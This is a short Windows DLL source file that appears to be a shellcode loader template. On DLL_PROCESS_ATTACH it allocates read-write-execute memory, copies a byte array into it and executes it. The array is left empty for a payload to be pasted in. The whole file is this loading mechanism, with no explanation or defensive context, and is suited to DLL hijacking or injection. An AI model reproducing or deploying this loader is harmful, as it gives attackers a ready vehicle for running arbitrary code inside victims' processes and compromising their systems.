#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
	{
		unsigned char buf[] = "";
		
		void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		 memcpy(exec, buf, sizeof buf);
		 ((void(*)())exec)();
		 return 0;
	}
       // Sleep(10000);  // Time interval in milliseconds.
    return TRUE;
}
